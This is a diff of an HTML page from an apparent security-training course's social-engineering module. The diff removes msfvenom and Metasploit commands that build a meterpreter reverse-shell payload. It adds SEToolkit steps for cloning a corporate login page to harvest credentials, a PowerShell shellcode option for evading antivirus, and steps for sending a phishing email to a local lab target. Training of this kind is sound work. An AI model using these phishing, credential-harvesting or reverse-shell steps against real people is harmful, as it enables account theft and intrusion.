@@ -36,11 +36,17 @@
                 <li><a href="../../modules/security-controls/overview.html">Security Controls</a></li>
                 <li><a href="../../modules/physical-security/overview.html">Physical Security</a></li>
                 <li><a href="../../modules/reporting/overview.html">Reporting</a></li>
+                <li><a href="../../modules/mcq-test/overview.html">Final MCQ Test</a></li>
             </ul>
         </div>
     </nav>
     <main class="main-content" id="content-anchor">
         # Module: Social Engineering
+
+<div class="glass-card">
+  <h2>📚 Theory & Class Notes</h2>
+  <p><strong>Social Engineering</strong> focuses entirely on the human element, exploiting psychology rather than technical flaws. It relies on manipulation, urgency, and authority to trick victims into breaking standard security procedures.<br><br><strong>Vulnerabilities:</strong> Human trust, lack of security awareness training, absent Multi-Factor Authentication (MFA), improperly configured SPF/DKIM/DMARC email records.<br><strong>Tools:</strong> Social Engineer Toolkit (SET), Evilginx2 (for AITM MFA bypass), GoPhish.</p>
+</div>
 
 <div class="glass-card">
   <h2>1. Core Concept 🧠</h2>
@@ -109,7 +115,15 @@
       <span class="meta-badge difficulty-medium">Difficulty: Medium</span>
       <span class="meta-badge">Time: 45 mins</span>
     </div>
-<div style="margin-top: 15px;"><a href="http://localhost:80" target="_blank" class="btn-start-lab">🚀 Start Lab Environment</a></div>
+    <div style="margin-top: 15px; display: flex; gap: 10px; flex-wrap: wrap;">
+      <button onclick="startLab('social-engineering')" class="btn-start-lab">▶ Start Social Lab</button>
+      <button onclick="stopLab('social-engineering')" class="btn-stop-lab">🛑 Stop Social Lab</button>
+      <a href="http://localhost:8001" target="_blank" class="btn-start-lab" style="margin-left:auto; background: #6366f1;">🌐 Open Fake SSO</a>
+    </div>
+    
+    <div id="console-social-engineering" class="terminal-output" style="display: none; background: #0f172a; color: #10b981; font-family: monospace; padding: 15px; border-radius: 6px; margin-top: 15px; border: 1px solid #334155; max-height: 300px; overflow-y: auto; text-align: left;">
+        <span style="color: #64748b;">[System] Awaiting initialization...</span>
+    </div>
   </div>
   
   <div class="lab-content">
@@ -123,16 +137,23 @@
     <img src="../../assets/phishing_arch.png" alt="Workshop Diagram" style="width: 100%; border-radius: 12px; border: 1px solid var(--border-color); box-shadow: var(--box-shadow); margin-bottom: 2rem;">
     
     <h4>Setup</h4>
-    <pre><code># The Social Engineer Toolkit (SET) is pre-installed in your Kali VM.
-# No docker setup required for this tool. Target is the provided simulated Windows Desktop.</code></pre>
+    <pre style="background: #0f172a; color: #e2e8f0; padding: 15px; border-radius: 6px; border: 1px solid #334155; overflow-x: auto;"><code># We have deployed a dummy "Corporate SSO" page for you to clone.
+# Make sure the lab container is running:
+cd ../../labs/docker/
+docker compose up -d social-engineering-app</code></pre>
     
     <h4>Attack Steps</h4>
-    <ol>
-      <li>Generate a payload using MSFvenom: <br><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe &gt; invoice.exe</code></li>
-      <li>Start the Metasploit handler to catch the connection: <br><code>msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.10.10; set LPORT 4444; exploit -j"</code></li>
-      <li>Use the Social Engineer Toolkit (<code>setoolkit</code>) to clone a corporate login page and host the file.</li>
-      <li>Simulate the victim clicking the link / opening the file.</li>
-      <li>Observe the Metasploit session open.</li>
+    <ol class="steps-list">
+      <li><strong>Information Gathering & Pretexting:</strong> Identify the dummy Corporate SSO Portal running on port <code>8001</code>. This is the page we will spoof to trick users.</li>
+      <li><strong>Configure SEToolkit:</strong> Run <code>setoolkit</code> in your attacker Kali VM. Select:<br>
+          <code style="background: #1e293b; padding: 2px 6px; border-radius: 4px;">1) Social-Engineering Attacks</code> &rarr; <code style="background: #1e293b; padding: 2px 6px; border-radius: 4px;">2) Website Attack Vectors</code> &rarr; <code style="background: #1e293b; padding: 2px 6px; border-radius: 4px;">3) Credential Harvester Attack Method</code> &rarr; <code style="background: #1e293b; padding: 2px 6px; border-radius: 4px;">2) Site Cloner</code>
+      </li>
+      <li><strong>Deploy the Cloned Site:</strong> When prompted, enter your Attacker IP (e.g. <code>10.0.0.10</code>) for the POST back, and enter the URL of the corporate SSO page to clone (e.g. <code>http://&lt;target-ip&gt;:8001</code>).
+      </li>
+      <li><strong>Payload Generation & Evasion:</strong> Simple `.exe` payloads are caught by Windows Defender immediately. Instead, attackers use fileless methods or chained macros. Try generating a PowerShell payload.<br>
+          In SEToolkit: <code>1) Social-Engineering Attacks</code> &rarr; <code>9) PowerShell Attack Vectors</code> &rarr; <code>1) PowerShell Alphanumeric Shellcode Injector</code>.
+      </li>
+      <li><strong>Simulate the Attack:</strong> Send the phishing email containing the link to your cloned portal and the malicious attachment. When the victim enters their credentials on the fake site, you capture them in plaintext! When they enable the Macro, you get a Metasploit reverse shell!</li>
     </ol>
     
     <h4>Expected Output</h4>
@@ -151,6 +172,73 @@
     
 </main>
 </div>
+
+<script>
+    let logIntervals = {};
+
+    async function startLab(labName) {
+        const consoleDiv = document.getElementById('console-' + labName);
+        if(consoleDiv) {
+            consoleDiv.style.display = 'block';
+            consoleDiv.innerHTML = '<span style="color: #64748b;">[System] Sending Boot command for ' + labName + '...</span><br>';
+        }
+        
+        try {
+            let res = await fetch('/api/start?lab=' + labName);
+            let data = await res.json();
+            if (data.status === 'error' || !res.ok) {
+                if(consoleDiv) consoleDiv.innerHTML += '<span style="color: #ef4444;">[System Error] ' + (data.message || 'Failed to start lab') + '</span><br>';
+                return;
+            }
+            if(consoleDiv) consoleDiv.innerHTML += '<span style="color: #3b82f6;">[System] ' + data.message + '</span><br>';
+            
+            if (logIntervals[labName]) clearInterval(logIntervals[labName]);
+            logIntervals[labName] = setInterval(() => pollLogs(labName), 2000);
+        } catch (e) {
+            if(consoleDiv) consoleDiv.innerHTML += '<span style="color: #ef4444;">[System Error] ' + e + '</span><br>';
+        }
+    }
+
+    async function stopLab(labName) {
+        const consoleDiv = document.getElementById('console-' + labName);
+        if (consoleDiv) {
+            consoleDiv.style.display = 'block';
+            consoleDiv.innerHTML += '<span style="color: #ef4444;">[System] Halting ' + labName + ' container...</span><br>';
+        }
+        
+        if (logIntervals[labName]) {
+            clearInterval(logIntervals[labName]);
+            delete logIntervals[labName];
+        }
+
+        try {
+            let res = await fetch('/api/stop?lab=' + labName);
+            let data = await res.json();
+            if(consoleDiv) consoleDiv.innerHTML += '<span style="color: #64748b;">[System] ' + data.message + '</span><br>';
+        } catch (e) {
+            if(consoleDiv) consoleDiv.innerHTML += '<span style="color: #ef4444;">[System Error] ' + e + '</span><br>';
+        }
+    }
+
+    async function pollLogs(labName) {
+        try {
+            let res = await fetch('/api/logs?lab=' + labName);
+            let data = await res.json();
+            const consoleDiv = document.getElementById('console-' + labName);
+            if (!consoleDiv) return;
+            
+            if (data.status === 'success') {
+                let safeLogs = data.logs.replace(/</g, "&lt;").replace(/>/g, "&gt;");
+                safeLogs = safeLogs.replace(/\n/g, "<br>");
+                const sysHeader = '<span style="color: #3b82f6;">[System] Streaming container logs...</span><br><br>';
+                consoleDiv.innerHTML = sysHeader + safeLogs;
+                consoleDiv.scrollTop = consoleDiv.scrollHeight;
+            }
+        } catch (e) {
+            console.error("Log poll failed", e);
+        }
+    }
+</script>
 
 <script>
     // Theme toggling logic
